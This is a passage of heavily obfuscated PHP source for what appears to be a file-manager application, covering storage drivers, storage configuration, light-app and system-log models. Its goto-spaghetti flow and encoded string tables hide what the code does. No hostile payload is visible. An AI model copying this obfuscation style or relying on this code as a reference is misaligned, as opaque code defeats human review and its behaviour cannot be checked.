$bìŞŞ¨’ƒ = array($Céñ‘èÏœ“[1215] => $Fî‚Ä¢‡Ù¸[1], $Céñ‘èÏœ“[205] => $Céñ‘èÏœ“[115], $Céñ‘èÏœ“[1128] => strlen($eÇÕÆ’Í)); $C«—¿ÄéòÚ = $Céñ‘èÏœ“[218]; $EˆêÎ¯š§à = $Céñ‘èÏœ“[8] . $this->pathEncode($cÌÏ—½éğ½) . $E“ÈÊ†»ÊÍ[$Céñ‘èÏœ“[156]]; goto Aìôœ‚¡ç‰; aëí†„Ÿê¹: $eÇÕÆ’Í .= $Céñ‘èÏœ“[1221]; $DáÄÙÅ´µ = array(); $Fî‚Ä¢‡Ù¸ = explode($Céñ‘èÏœ“[167], $this->getHost()); goto fØÅ×ÒË­Í; Aìôœ‚¡ç‰: $C°øµâ¾‡í = $this->client->__getSignatureV4($DáÄÙÅ´µ, $bìŞŞ¨’ƒ, $C«—¿ÄéòÚ, $EˆêÎ¯š§à, $eÇÕÆ’Í); return array($Céñ‘èÏœ“[225] => $C°øµâ¾‡í[$Céñ‘èÏœ“[225]], $Céñ‘èÏœ“[216] => $C°øµâ¾‡í[$Céñ‘èÏœ“[1217]], $Céñ‘èÏœ“[227] => $a©†Ì…÷Š, $Céñ‘èÏœ“[1214] => $C°øµâ¾‡í[$Céñ‘èÏœ“[1214]]); goto EØÙÒäÓà; Bø¯¨İ¬Îš: $Céñ‘èÏœ“ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Dâ­“›Ó‚Á = str_replace($Céñ‘èÏœ“[226], $Céñ‘èÏœ“[33], $E“ÈÊ†»ÊÍ[$Céñ‘èÏœ“[156]]); $a©†Ì…÷Š = $this->client->listParts($this->bucket, $cÌÏ—½éğ½, $Dâ­“›Ó‚Á); goto FÉ—›æ²ˆ; EØÙÒäÓà: } public function link($Fôª“âÛ”±, $fˆÆÔ÷œÜ² = array()) { return parent::link($Fôª“âÛ”±, $fˆÆÔ÷œÜ²); } public function fileOut($B„ñ –ôª×, $DÓÔğğ¡·¼ = false, $F‹‡±…šì¦ = false, $B¦çİßµÀÂ = '') { if (strstr($this->endpoint, $_SERVER[ºÖÙÂŒäÉê‡][1222])) { return parent::fileOutServer($B„ñ –ôª×, $DÓÔğğ¡·¼, $F‹‡±…šì¦, $B¦çİßµÀÂ); } parent::fileOut($B„ñ –ôª×, $DÓÔğğ¡·¼, $F‹‡±…šì¦, $B¦çİßµÀÂ); } public function fileOutImage($B‚Ïõ„ºÏ, $EØÈŞËÜµ‹ = 250) { if (strstr($this->endpoint, $_SERVER[ºÖÙÂŒäÉê‡][1222])) { return parent::fileOutImageServer($B‚Ïõ„ºÏ, $EØÈŞËÜµ‹); } parent::fileOutImage($B‚Ïõ„ºÏ, $EØÈŞËÜµ‹); } public function fileOutLink($F—„†‰¶) { $AŠ– Ûø¥ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (substr($F—„†‰¶, 0, 7) == $AŠ– Ûø¥[1098]) { $F—„†‰¶ = $AŠ– Ûø¥[1099] . substr($F—„†‰¶, 7); } header($AŠ– Ûø¥[152] . $F—„†‰¶); die; } public function getHost() { $AáïÙ”öÙÎ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bãÏ¡À•µ = str_rtrim(parent::getHost(), $AáïÙ”öÙÎ[8] . $this->bucket); $bãÏ¡À•µ = explode($AáïÙ”öÙÎ[167], $bãÏ¡À•µ); return $bãÏ¡À•µ[0] . $AáïÙ”öÙÎ[167] . $this->bucket . $AáïÙ”öÙÎ[91] . $bãÏ¡À•µ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($E±®Èò§ì‰, $A…·’¥‡° = 0) { parent::__construct(); $this->source = $E±®Èò§ì‰; $this->sourceSize = $A…·’¥‡°; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($c–±¥ä°»Ï = false) { return $this->sourceSize; } public function getContent($CİñíÂÎÒ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $c³øëù÷Ã = ftell($this->source); $cË‘½ƒ‚ŒŸ = @fread($this->source, $this->sourceSize); fseek($this->source, $c³øëù÷Ã); return $cË‘½ƒ‚ŒŸ; } } public function fileSubstr($B¨µÌõêƒ« = false, $E¤ÛÑ—‚Ë = 0, $FˆŒÀ§¡±í = 0) { if (!$FˆŒÀ§¡±í) { $FˆŒÀ§¡±í = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $E¤ÛÑ—‚Ë, $FˆŒÀ§¡±í); } if ($this->sourceType == self::TYPE_FILE) { $dÓ³®º¶Ä = ftell($this->source); fseek($this->source, $dÓ³®º¶Ä + $E¤ÛÑ—‚Ë); $dßã¤Ä¼¡Á = @fread($this->source, $FˆŒÀ§¡±í); fseek($this->source, $dÓ³®º¶Ä); return $dßã¤Ä¼¡Á; } } public function hashMd5($dÅŸÌÊöÌ÷ = false) { return md5($this->getContent()); } public static function hash($AïÎ‹‡§¼, $BÛÑÇÓáÒ = 0) { $cçˆŒë­’ù = new PathDriverStream($AïÎ‹‡§¼, $BÛÑÇÓáÒ); return $cçˆŒë­’ù->hashSimple($AïÎ‹‡§¼); } public static function md5($E†á‰‡çÚ‹, $D—˜®ÁÒó” = 0) { $CÌñÎ«ƒŠ¿ = new PathDriverStream($E†á‰‡çÚ‹, $D—˜®ÁÒó”); return $CÌñÎ«ƒŠ¿->hashMd5($E†á‰‡çÚ‹); } } goto F„ßå¸›’Ø; f‹î¹³ãîø: function ActionCall($b¹ÄÓ¥‹èƒ) { $a¯ÈÛÈ¦Ø = array_slice(func_get_args(), 1); return ActionApply($b¹ÄÓ¥‹èƒ, $a¯ÈÛÈ¦Ø); } function ActionCallApi($AÂ°äßÊ²Ç, $D¡æê¢¦ï = '') { goto eåÖÔ†‡Ì; dÜŞŠÒùÇŒ: $FÁÀÍæçÂ‡ = phpBinCommand(); if ($FÁÀÍæçÂ‡ && function_exists($F×éïòÛ«»[25])) { $DÁª¬¦Ñ¥ˆ = $FÁÀÍæçÂ‡ . $F×éïòÛ«»[26] . BASIC_PATH . $F×éïòÛ«»[27] . escapeshellarg($AÂ°äßÊ²Ç); $bˆ­‡äƒä = shell_exec($DÁª¬¦Ñ¥ˆ); } if (!$bˆ­‡äƒä) { $cÄÍ°ó·› = stream_context_create(array($F×éïòÛ«»[28] => array($F×éïòÛ«»[29] => 20, $F×éïòÛ«»[30] => $F×éïòÛ«»[31]))); $bˆ­‡äƒä = file_get_contents(APP_HOST . $F×éïòÛ«»[32] . $AÂ°äßÊ²Ç, !1, $cÄÍ°ó·›); } goto D¡©ƒ‡Š; eåÖÔ†‡Ì: $F×éïòÛ«» =& $_SERVER[Ş†Ÿ·Ñ«”ÔÂ]; $Aæƒ·‹„æ– = $D¡æê¢¦ï; if (is_array($D¡æê¢¦ï)) { $Aæƒ·‹„æ– = $F×éïòÛ«»[20]; foreach ($D¡æê¢¦ï as $bŒÜµÆÀ¤ => $føÄŒçã¿—) { $føÄŒçã¿— = is_array($føÄŒçã¿—) ? json_encode($føÄŒçã¿—) : $føÄŒçã¿—; $føÄŒçã¿— = is_bool($føÄŒçã¿—) ? intval($føÄŒçã¿—) : $føÄŒçã¿—; $Aæƒ·‹„æ– .= $F×éïòÛ«»[21] . $bŒÜµÆÀ¤ . $F×éïòÛ«»[22] . rawurlencode($føÄŒçã¿—); } } goto C‡Ê‘ÒØ„·; C‡Ê‘ÒØ„·: $Fº• ôÄ—‰ = Action($F×éïòÛ«»[23])->accessToken(); $AÂ°äßÊ²Ç = str_replace($F×éïòÛ«»[5], $F×éïòÛ«»[4], $AÂ°äßÊ²Ç) . $F×éïòÛ«»[24] . $Fº• ôÄ—‰ . $Aæƒ·‹„æ–; $bˆ­‡äƒä = $F×éïòÛ«»[20]; goto dÜŞŠÒùÇŒ; D¡©ƒ‡Š: $E×ĞĞ°£ï‡ = json_decode($bˆ­‡äƒä, !0); $fÓĞŒÚ˜·É = is_array($E×ĞĞ°£ï‡) ? $E×ĞĞ°£ï‡ : array($F×éïòÛ«»[33] => null, $F×éïòÛ«»[34] => $bˆ­‡äƒä); if (!$E×ĞĞ°£ï‡) { echo $bˆ­‡äƒä; } goto b¨’çòêÁ¾; b¨’çòêÁ¾: return $fÓĞŒÚ˜·É; goto E”† Úß÷; E”† Úß÷: } function ActionCallHook($Cƒ¬ÏÆĞ¸) { goto e“ñ¢²œñ; e“ñ¢²œñ: $BÏ¿¹Íƒ²¡ =& $_SERVER[Ş†Ÿ·Ñ«”ÔÂ]; ob_start(); $EÆßàÆ¶Ä¦ = array_slice(func_get_args(), 1); goto bß‘ğ‚”Ñ; bß‘ğ‚”Ñ: $GLOBALS[$BÏ¿¹Íƒ²¡[35]] = 1; $c’ÛÆ²„’ò = ActionApply($Cƒ¬ÏÆĞ¸, $EÆßàÆ¶Ä¦); $CéÊôŠö¹¢ = ob_get_clean(); goto E˜™ÓÒ•¥Ä; E˜™ÓÒ•¥Ä: $c’ÛÆ²„’ò = $CéÊôŠö¹¢ ? json_decode($CéÊôŠö¹¢, !0) : $c’ÛÆ²„’ò; $GLOBALS[$BÏ¿¹Íƒ²¡[35]] = 0; return $c’ÛÆ²„’ò; goto dÃ–‹ ÎøÖ; dÃ–‹ ÎøÖ: } goto bŸáåâ”¡; AÇÛïª…ÓŒ: define($_SERVER[ºÖÙÂŒäÉê‡][234], 1); define($_SERVER[ºÖÙÂŒäÉê‡][235], 0); define($_SERVER[ºÖÙÂŒäÉê‡][236], 2); goto E ×£ùÚ¬·; C§µ‰¼±êó: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\x73\x74\x6f\162\x61\x67\145\x4c\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\x73\151\172\x65\x4d\141\x78", "\x73\171\x73\x74\145\x6d", "\x64\x65\146\x61\165\154\164", "\x64\x72\151\x76\145\162", "\143\157\156\146\151\147"); public function listData($f°ª•­Éï = false, $a¢²ÈˆÄ‹± = "\155\157\x64\151\146\171\x54\x69\155\x65", $a¦øÂó®¡ = false) { goto D´±æÙ¬–; dƒÊ¬šÄö‰: return $fÂõÔš„¾‚; goto cñ³·ÅâÒÇ; D´±æÙ¬–: $eö…™¡³†õ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fÂõÔš„¾‚ = parent::listData($f°ª•­Éï, $a¢²ÈˆÄ‹±, $a¦øÂó®¡); if ($f°ª•­Éï) { return $fÂõÔš„¾‚; } goto E¢¸§«ìÅ; E¢¸§«ìÅ: foreach ($fÂõÔš„¾‚ as $eÁæ¦«£Œæ => $e£Ÿëä‘‹§) { unset($fÂõÔš„¾‚[$eÁæ¦«£Œæ][$eö…™¡³†õ[6]]); $fÂõÔš„¾‚[$eÁæ¦«£Œæ][$eö…™¡³†õ[2052]] = 0; } $f„Ø…Œ¾Ç“ = array_to_keyvalue($fÂõÔš„¾‚, $eö…™¡³†õ[33], $eö…™¡³†õ[372]); $this->_listAppendSize($fÂõÔš„¾‚, $f„Ø…Œ¾Ç“); goto dƒÊ¬šÄö‰; cñ³·ÅâÒÇ: } public function _listAppendSize(&$A™ÅùšŞˆ¢, $c³ĞÉˆ¥ñ­) { $Bíó ¥“š =& $_SERVER[ºÖÙÂŒäÉê‡]; $E¡ÙÖ°‡¸ = $Bíó ¥“š[2318] . implode($Bíó ¥“š[47], $c³ĞÉˆ¥ñ­) . $Bíó ¥“š[2319]; $cÏÓ¬®Ñï  = Model($Bíó ¥“š[718])->query($E¡ÙÖ°‡¸); $cÏÓ¬®Ñï  = array_to_keyvalue($cÏÓ¬®Ñï , $Bíó ¥“š[372], $Bíó ¥“š[77]); foreach ($A™ÅùšŞˆ¢ as $dÜİÇ¼Ó => $d’ëßÅöùå) { $A™ÅùšŞˆ¢[$dÜİÇ¼Ó][$Bíó ¥“š[2052]] = isset($cÏÓ¬®Ñï [$d’ëßÅöùå[$Bíó ¥“š[372]]]) ? $cÏÓ¬®Ñï [$d’ëßÅöùå[$Bíó ¥“š[372]]] : 0; } } public function getConfig($b¹Ş‘ÙŠõŸ) { $b»ëä‡ò„ñ = parent::listData($b¹Ş‘ÙŠõŸ); return json_decode($b»ëä‡ò„ñ[$_SERVER[ºÖÙÂŒäÉê‡][6]], !0); } public function update($a÷¦åÚĞÅ¤, $DÖßÙÄó‚) { goto BƒÑ¤­ÂŸ; BƒÑ¤­ÂŸ: $cèÍï¾£ =& $_SERVER[ºÖÙÂŒäÉê‡]; $D‡ İ¤®ˆƒ = $DÖßÙÄó‚[$cèÍï¾£[28]]; $a“á‹»àì¬ = array_to_keyvalue(parent::listData(), $cèÍï¾£[28]); goto F…™àÚŞÇÍ; F…™àÚŞÇÍ: if (isset($a“á‹»àì¬[$D‡ İ¤®ˆƒ]) && $a“á‹»àì¬[$D‡ İ¤®ˆƒ][$cèÍï¾£[372]] != $a÷¦åÚĞÅ¤) { return !1; } if (isset($DÖßÙÄó‚[$cèÍï¾£[2320]]) && $DÖßÙÄó‚[$cèÍï¾£[2320]] == $cèÍï¾£[83]) { $this->checkConfig($DÖßÙÄó‚); } unset($DÖßÙÄó‚[$cèÍï¾£[2320]]); goto aÍñã¯›Ì; aÍñã¯›Ì: $a†äØ‡Ñ÷œ = parent::update($a÷¦åÚĞÅ¤, $DÖßÙÄó‚); if ($a†äØ‡Ñ÷œ && $DÖßÙÄó‚[$cèÍï¾£[34]]) { foreach ($a“á‹»àì¬ as $DÈ¿’——×ˆ) { if ($DÈ¿’——×ˆ[$cèÍï¾£[34]] && $DÈ¿’——×ˆ[$cèÍï¾£[372]] != $a÷¦åÚĞÅ¤) { parent::update($DÈ¿’——×ˆ[$cèÍï¾£[372]], array($cèÍï¾£[34] => 0)); } } } return $a†äØ‡Ñ÷œ; goto EæÂ“‹ë°ª; EæÂ“‹ë°ª: } public function add($eß‰Ê¨Š›¾) { goto E‹î„Ø‡‚„; a—Ò·õùÇÊ: $this->checkConfig($eß‰Ê¨Š›¾); $a¡ä£×íöì = parent::insert($eß‰Ê¨Š›¾); if ($a¡ä£×íöì && $eß‰Ê¨Š›¾[$fÉ§êÂª†Ó[34]]) { foreach ($fñßÚŠ…ÎÅ as $dºè©ÃÎ†®) { if ($dºè©ÃÎ†®[$fÉ§êÂª†Ó[34]]) { parent::update($dºè©ÃÎ†®[$fÉ§êÂª†Ó[372]], array($fÉ§êÂª†Ó[34] => 0)); } } } goto EØ«£ÏÛŸ; E‹î„Ø‡‚„: $fÉ§êÂª†Ó =& $_SERVER[ºÖÙÂŒäÉê‡]; $fñßÚŠ…ÎÅ = array_to_keyvalue(parent::listData(), $fÉ§êÂª†Ó[28]); if (isset($fñßÚŠ…ÎÅ[$eß‰Ê¨Š›¾[$fÉ§êÂª†Ó[28]]])) { return !1; } goto a—Ò·õùÇÊ; EØ«£ÏÛŸ: return $a¡ä£×íöì; goto fšÄÖÓÖ‚¼; fšÄÖÓÖ‚¼: } public function checkConfig(&$FŠÙºï´ƒ´) { goto b…ùªĞ×“; d¤¨ãñ’‹ê: $FŠÙºï´ƒ´[$AÙÁ¡Õêİ[6]] = json_encode($C¬ø£àˆ¿); $FŠÙºï´ƒ´[$AÙÁ¡Õêİ[90]] = $C¯ÈøÀ„¸á; return !0; goto F ğ‘Ñ£‚; C¿Ø½Ş»ÑÕ: foreach ($C¬ø£àˆ¿ as $dñÕÄ™«Á => $d¸Áß¡îğ‰) { $C¬ø£àˆ¿[$dñÕÄ™«Á] = trim($d¸Áß¡îğ‰); } $B¶‡ŒçÈÎÌ = rtrim($C¬ø£àˆ¿[$AÙÁ¡Õêİ[1014]], $AÙÁ¡Õêİ[8]) . $AÙÁ¡Õêİ[8]; $C¯ÈøÀ„¸á = $this->driverType($Cîêƒ¡Îë); goto d» ¢«†÷„; DÙÉŒÎææË: $e¼¥°½Í½å = $AİÕ¨Ç£¥->getPath($B¶‡ŒçÈÎÌ . $AÙÁ¡Õêİ[1948]); if (!$AİÕ¨Ç£¥->mkfile($e¼¥°½Í½å)) { show_json(LNG($AÙÁ¡Õêİ[2321]), !1); } $C¬ø£àˆ¿[$AÙÁ¡Õêİ[1014]] = $B¶‡ŒçÈÎÌ; goto d¤¨ãñ’‹ê; d» ¢«†÷„: $DŒÎ÷Êùä = $AÙÁ¡Õêİ[71] . $C¯ÈøÀ„¸á; $AİÕ¨Ç£¥ = new $DŒÎ÷Êùä($C¬ø£àˆ¿); if (in_array($Cîêƒ¡Îë, $AİÕ¨Ç£¥->objectDriver)) { if (!$AİÕ¨Ç£¥->isBucketCors() && !$AİÕ¨Ç£¥->setBucketCors()) { $e†èù™’šì = LNG($AÙÁ¡Õêİ[2321]); $e†èù™’šì .= $AÙÁ¡Õêİ[2322] . LNG($AÙÁ¡Õêİ[2323]); show_json($e†èù™’šì, !1); } } goto DÙÉŒÎææË; b…ùªĞ×“: $AÙÁ¡Õêİ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cîêƒ¡Îë = strtolower($FŠÙºï´ƒ´[$AÙÁ¡Õêİ[90]]); $C¬ø£àˆ¿ = json_decode_force($FŠÙºï´ƒ´[$AÙÁ¡Õêİ[6]]); goto C¿Ø½Ş»ÑÕ; F ğ‘Ñ£‚: } private function driverType($eˆÊ†‡ÓÅŒ) { $Bá“ ¿¶„Ú =& $_SERVER[ºÖÙÂŒäÉê‡]; $Bˆ‘ö”Ôù = array($Bá“ ¿¶„Ú[101] => $Bá“ ¿¶„Ú[2324], $Bá“ ¿¶„Ú[58] => $Bá“ ¿¶„Ú[2325], $Bá“ ¿¶„Ú[64] => $Bá“ ¿¶„Ú[2326]); if (isset($Bˆ‘ö”Ôù[$eˆÊ†‡ÓÅŒ])) { return $Bˆ‘ö”Ôù[$eˆÊ†‡ÓÅŒ]; } return strtoupper($eˆÊ†‡ÓÅŒ); } public function driverListSystem() { $a“ù»²èÂ =& $_SERVER[ºÖÙÂŒäÉê‡]; $a‘’»Ùó¹ = parent::listData(); $dŞõì‘½¨È = array(); foreach ($a‘’»Ùó¹ as $EóÊĞ‡ÉÒ¨) { unset($EóÊĞ‡ÉÒ¨[$a“ù»²èÂ[193]], $EóÊĞ‡ÉÒ¨[$a“ù»²èÂ[106]]); $EóÊĞ‡ÉÒ¨[$a“ù»²èÂ[6]] = json_decode_force($EóÊĞ‡ÉÒ¨[$a“ù»²èÂ[6]]); $dŞõì‘½¨È[] = $EóÊĞ‡ÉÒ¨; } return $dŞõì‘½¨È; } public function defaultDriver() { $aèßòìêã¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f•è¯øã–Æ = parent::listData(); $BŒ¯÷ÍŸáê = array_filter_by_field($f•è¯øã–Æ, $aèßòìêã¤[34], 1); $BŒ¯÷ÍŸáê = $BŒ¯÷ÍŸáê[0]; if ($BŒ¯÷ÍŸáê) { $BŒ¯÷ÍŸáê[$aèßòìêã¤[6]] = json_decode($BŒ¯÷ÍŸáê[$aèßòìêã¤[6]], !0); } return $BŒ¯÷ÍŸáê; } public function driverInfo($BÏ…¾‚Ù´) { $d»ß¿—½õ± =& $_SERVER[ºÖÙÂŒäÉê‡]; $Bç·îÂšèæ = array_to_keyvalue(parent::listData(), $d»ß¿—½õ±[372]); if (!isset($Bç·îÂšèæ[$BÏ…¾‚Ù´])) { return !1; } $aÂĞß°… = $Bç·îÂšèæ[$BÏ…¾‚Ù´]; $aÂĞß°…[$d»ß¿—½õ±[6]] = json_decode_force($aÂĞß°…[$d»ß¿—½õ±[6]]); return $aÂĞß°…; } public function remove($eŠÉŠæ¹İõ) { $this->removeShareItems($eŠÉŠæ¹İõ); return parent::remove($eŠÉŠæ¹İõ); } public function removeWithFile($aØ Š—‹Ê) { goto DÓâĞÛªªË; C¦„¸¢â“á: $c´îÌÎäÅ÷ = Model($C¦Ùæ‘õÀ‚[163])->where($dôØ‡Øëùœ)->field($C¦Ùæ‘õÀ‚[2330])->select(); foreach ($c´îÌÎäÅ÷ as $d­Ëî¤ß¸ˆ) { goto c•çƒ Ê»; c•çƒ Ê»: $fÙçË™ÇÉ = $d­Ëî¤ß¸ˆ[$C¦Ùæ‘õÀ‚[75]]; $cê¡Ç¹†Ú = $E¾¡à°Ôšƒ . str_replace("\x7b\151\157\72{$aØ Š—‹Ê}\x7d\57", $C¦Ùæ‘õÀ‚[33], $fÙçË™ÇÉ); if (!IO::exist($fÙçË™ÇÉ)) { $F½óÄ§„Í—[] = $d­Ëî¤ß¸ˆ[$C¦Ùæ‘õÀ‚[423]]; $B±¾ÉÄŸÊŸ->updateFileEnd($d­Ëî¤ß¸ˆ[$C¦Ùæ‘õÀ‚[28]], $d­Ëî¤ß¸ˆ[$C¦Ùæ‘õÀ‚[77]]); continue; } goto dÖ«ˆ¥Ü; dÖ«ˆ¥Ü: if (IO::exist($cê¡Ç¹†Ú)) { $B±¾ÉÄŸÊŸ->updateFileEnd($d­Ëî¤ß¸ˆ[$C¦Ùæ‘õÀ‚[28]], $d­Ëî¤ß¸ˆ[$C¦Ùæ‘õÀ‚[77]]); continue; } if (!IO::move($fÙçË™ÇÉ, get_path_father($cê¡Ç¹†Ú))) { $F’é´Ñ®† = !1; break; } $dôØ‡Øëùœ = array($C¦Ùæ‘õÀ‚[423] => $d­Ëî¤ß¸ˆ[$C¦Ùæ‘õÀ‚[423]]); goto bæ±òµâõ¾; bæ±òµâõ¾: $e†·˜Ô´“Ó = array($C¦Ùæ‘õÀ‚[742] => $cĞÙ¿³´×—, $C¦Ùæ‘õÀ‚[75] => $cê¡Ç¹†Ú); Model($C¦Ùæ‘õÀ‚[163])->where($dôØ‡Øëùœ)->save($e†·˜Ô´“Ó); goto FøµœïÅ×ñ; FøµœïÅ×ñ: } $this->removeByFileID($F½óÄ§„Í—); goto FíÀê¢–·ó; CĞ˜‚¦¦ù’: $E©ÓÕŞÌ¤ = Model($C¦Ùæ‘õÀ‚[426])->where($dôØ‡Øëùœ)->sum($C¦Ùæ‘õÀ‚[77]); $b«ÀŞ°‹¾ê = $C¦Ùæ‘õÀ‚[2327] . $aØ Š—‹Ê; $B±¾ÉÄŸÊŸ = new TaskFileTransfer($b«ÀŞ°‹¾ê, $C¦Ùæ‘õÀ‚[2328], $EÕ†ÅØ—Ú, LNG($C¦Ùæ‘õÀ‚[2329]) . "\x28{$aØ Š—‹Ê}\51"); goto bçÑ©Ğ«¢ˆ; DÓâĞÛªªË: $C¦Ùæ‘õÀ‚ =& $_SERVER[ºÖÙÂŒäÉê‡]; $dôØ‡Øëùœ = array($C¦Ùæ‘õÀ‚[742] => $aØ Š—‹Ê); $EÕ†ÅØ—Ú = Model($C¦Ùæ‘õÀ‚[426])->where($dôØ‡Øëùœ)->count(); goto CĞ˜‚¦¦ù’; FíÀê¢–·ó: if (!$F’é´Ñ®†) { $B±¾ÉÄŸÊŸ->stop($b«ÀŞ°‹¾ê); return !1; } $B±¾ÉÄŸÊŸ->end(); $this->remove($aØ Š—‹Ê); goto dçö—ŸˆŠ; c£Œ´Î¤­’: $E¾¡à°Ôšƒ = "\x7b\x69\x6f\72{$cĞÙ¿³´×—}\175\57"; $F’é´Ñ®† = !0; $F½óÄ§„Í— = array(); goto C¦„¸¢â“á; bçÑ©Ğ«¢ˆ: $B±¾ÉÄŸÊŸ->task[$C¦Ùæ‘õÀ‚[695]] = (double) $E©ÓÕŞÌ¤; $b‚Ş³ÆÔä÷ = KodIO::defaultDriver(); $cĞÙ¿³´×— = $b‚Ş³ÆÔä÷[$C¦Ùæ‘õÀ‚[372]]; goto c£Œ´Î¤­’; dçö—ŸˆŠ: } public function progress($eµ¶ì½èë) { return Task::get($_SERVER[ºÖÙÂŒäÉê‡][2327] . $eµ¶ì½èë); } private function removeByFileID($aŒ¤®„Ü‡° = array()) { goto CÂ¤«×İ’; cß®„‚ê¤: $bø±™áŸ = Model($C‹¸²ƒ¨ï[1100])->where($B½Â…‰Ïùç)->field($C‹¸²ƒ¨ï[374])->select(); if (!$bø±™áŸ) { return; } $bø±™áŸ = array_to_keyvalue($bø±™áŸ, $C‹¸²ƒ¨ï[33], $C‹¸²ƒ¨ï[374]); goto dàÎ‚¸¬î¦; CÂ¤«×İ’: $C‹¸²ƒ¨ï =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($aŒ¤®„Ü‡°)) { return; } $B½Â…‰Ïùç = array($C‹¸²ƒ¨ï[423] => array($C‹¸²ƒ¨ï[7], $aŒ¤®„Ü‡°)); goto cß®„‚ê¤; dàÎ‚¸¬î¦: foreach ($bø±™áŸ as $dÊµÅÚÜµ) { Model($C‹¸²ƒ¨ï[387])->removeNow($dÊµÅÚÜµ, !1); } goto e³îáŞâ…; e³îáŞâ…: } private function removeShareItems($bÅäÀËÀß®) { goto Bó“¬†¡‘ö; F‚î’—ÀÒÜ: Model($e¼é­ø‡¦Ó[540])->remove($a”‰òõÁò²); goto bÁÄ›âˆ´¿; e•¯£Êê³¦: $d—®¤¹èÛğ = Model($e¼é­ø‡¦Ó[2043])->where($FˆíÂ¿Ìã)->field($e¼é­ø‡¦Ó[445])->select(); if (empty($d—®¤¹èÛğ)) { return; } $a”‰òõÁò² = array_to_keyvalue($d—®¤¹èÛğ, $e¼é­ø‡¦Ó[33], $e¼é­ø‡¦Ó[445]); goto F‚î’—ÀÒÜ; Bó“¬†¡‘ö: $e¼é­ø‡¦Ó =& $_SERVER[ºÖÙÂŒäÉê‡]; $BÁÉ’â°â = "\x7b\x69\157\x3a{$bÅäÀËÀß®}\x7d\x2f"; $FˆíÂ¿Ìã = array($e¼é­ø‡¦Ó[374] => 0, $e¼é­ø‡¦Ó[1008] => array($e¼é­ø‡¦Ó[750], "{$BÁÉ’â°â}\45")); goto e•¯£Êê³¦; bÁÄ›âˆ´¿: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\x2e\x4c\151\147\150\164\101\160\x70"; public $modelType = "\x53\x79\x73\164\x65\x6d\x4f\160\x74\x69\157\156"; public $field = array("\156\141\x6d\x65", "\x67\x72\157\165\160", "\144\145\x73\143", "\143\x6f\156\164\145\156\x74"); public function listData($eùÇï¾Ÿêº = false, $D‡½Õœæí‰ = "\x6d\157\x64\x69\146\x79\124\x69\x6d\145", $fëµ¡¿ ğ = true) { return parent::listData($eùÇï¾Ÿêº, $D‡½Õœæí‰, $fëµ¡¿ ğ); } public function remove($Aã³Ç´Œì§) { $CÖ£’ÑĞ = $this->findByName($Aã³Ç´Œì§); if (!$CÖ£’ÑĞ) { return !1; } return parent::remove($CÖ£’ÑĞ[$_SERVER[ºÖÙÂŒäÉê‡][372]]); } public function add($B—òâ‡º©Ê) { if ($this->findByName($B—òâ‡º©Ê[$_SERVER[ºÖÙÂŒäÉê‡][28]])) { return !1; } return parent::insert($B—òâ‡º©Ê); } public function update($A³ã”ôØôè, $AÖœ™‘½É) { $eÀ²œ‚‰áˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; $B¦ôÄá¾¼ = $this->findByName($A³ã”ôØôè); $dçëª·É¾ = $this->findByName($AÖœ™‘½É[$eÀ²œ‚‰áˆ[28]]); if (!$B¦ôÄá¾¼ || $dçëª·É¾ && $dçëª·É¾[$eÀ²œ‚‰áˆ[372]] != $B¦ôÄá¾¼[$eÀ²œ‚‰áˆ[372]]) { return !1; } return parent::update($B¦ôÄá¾¼[$eÀ²œ‚‰áˆ[372]], $AÖœ™‘½É); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\155\137\154\x6f\147"; protected $dataAuto = array(array("\x63\162\x65\141\164\145\x54\151\x6d\x65", "\164\x69\155\x65", "\x69\156\163\145\x72\x74", "\146\165\x6e\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $eˆõ¡š·¬Ù =& $_SERVER[ºÖÙÂŒäÉê‡]; return array($eˆõ¡š·¬Ù[2331] => LNG($eˆõ¡š·¬Ù[2332]), $eˆõ¡š·¬Ù[2333] => LNG($eˆõ¡š·¬Ù[2334]), $eˆõ¡š·¬Ù[2006] => LNG($eˆõ¡š·¬Ù[2335]), $eˆõ¡š·¬Ù[2336] => LNG($eˆõ¡š·¬Ù[2337]), $eˆõ¡š·¬Ù[2338] => LNG($eˆõ¡š·¬Ù[2339]), $eˆõ¡š·¬Ù[2340] => LNG($eˆõ¡š·¬Ù[2341]), $eˆõ¡š·¬Ù[2342] => LNG($eˆõ¡š·¬Ù[2343]), $eˆõ¡š·¬Ù[2344] => LNG($eˆõ¡š·¬Ù[2345]), $eˆõ¡š·¬Ù[2037] => LNG($eˆõ¡š·¬Ù[2346]), $eˆõ¡š·¬Ù[2038] => LNG($eˆõ¡š·¬Ù[2347]), $eˆõ¡š·¬Ù[2348] => LNG($eˆõ¡š·¬Ù[2349]), $eˆõ¡š·¬Ù[2350] => LNG($eˆõ¡š·¬Ù[2351]), $eˆõ¡š·¬Ù[2352] => LNG($eˆõ¡š·¬Ù[2353]), $eˆõ¡š·¬Ù[2354] => LNG($eˆõ¡š·¬Ù[2355]), $eˆõ¡š·¬Ù[2035] => LNG($eˆõ¡š·¬Ù[2356]), $eˆõ¡š·¬Ù[2041] => LNG($eˆõ¡š·¬Ù[2357]), $eˆõ¡š·¬Ù[2358] => LNG($eˆõ¡š·¬Ù[2359]), $eˆõ¡š·¬Ù[2360] => LNG($eˆõ¡š·¬Ù[2361]), $eˆõ¡š·¬Ù[2362] => LNG($eˆõ¡š·¬Ù[2363]), $eˆõ¡š·¬Ù[2364] => LNG($eˆõ¡š·¬Ù[2365]), $eˆõ¡š·¬Ù[2044] => 